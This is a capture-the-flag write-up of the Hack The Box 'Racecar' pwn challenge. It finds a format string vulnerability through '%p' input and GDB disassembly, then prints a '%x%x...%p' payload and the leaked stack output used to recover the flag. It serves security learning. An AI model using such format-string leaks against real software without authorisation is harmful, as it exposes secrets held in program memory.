# HTB Challenges (PWN) - Racecar 

Did you know that racecar spelled backwards is racecar? Well, now that you know everything about racing, win this race and get the flag!

## Challenge Materials

- racecar : executable
	- ELF 32-bit, dynamically linked, not stripped
- ip and port : htb instance to interact with challenge

## Runtime analysis

1. Prompts for name and nickname
2. Prompts for either 1. Car info or 2. Car selection
	- 1 prints details about the cars and reprompts
	- 2 prompts to select car 1 or 2
3. After choosing car, prompts for race type. Either 1. Highway or 2. Circuit
4. After choosing race type, either wins or loses then exits

###  Winning path 
- Input: Select car (2), Coupe (1), Circuit (2) wins each time
- Running locally prompts for something to "say to the press" but also says cannot open flag.txt
- Create local flag.txt
- Rerun and prompt works **potential point of vulnerability**

###  Bad Input
- Buffer overflows seem to be avoided. Echo of press message cuts off at 44 characters
- **Address reference** 
	- use "%p" for press message. Returns address of variable
	- Providing %p as the press message prints a hex value. **vuln found**

## Dynamic Analysis (Using GDB)

- info functions: main, menu, car\_info, info, car\_menu, race\_type, setup, banner
- car\_menu seems to be what handles the majority of input, disassemble

### Disassemble car\_menu

- calls fopen() at car\_menu <+764>, we know that running the executable locally without flag.txt printed an error that it was unable to open, so looking near this will likely get us the flag
- also calls fgets() at car\_menu <+828>, this would be where the program prompts the user after winning the face
- three calls to printf() follow fgets(). Since we were able to enter a %p and get the pointer address back, likely printf() was used insecurely
- set breakpoints at each and see which is called > car\_menu <+881>
- **format string vulnerability**

## Exploitation

- Fill flag.txt with "AAAAA"... we will be able to tell where the flag is being stored easily (A -> 0x41)
- Leak more data using %p%p%p ... on media message input
	- with 15 "%p"'s -> 0x566af2000x1700x5658ed850x30x440x260x10x20x5658f96c0x566af2000x566af3800x414141410x5658000a0xf7de12a90x6713f400
	- flag seems to be on the stack at the 12th memory location

- We will need to chew through 11 memory locations then print the flag

### Payload

- %x%x%x%x%x%x%x%x%x%x%x FLAG: %p%p%p%p%p%p%p%p%p%p%p 
- 571121c0170565c8d851572612565c996c571121c057112340 FLAG: 0x7b4254480x5f7968770x5f6431640x34735f310x745f33760x665f33680x5f67346c0x745f6e300x355f33680x6b6334740x7d213f
- 7b = {, 42 = B, 54 = T, 48 = H. The system is **little endian**

### Automate

- See **racecar-solution.py**

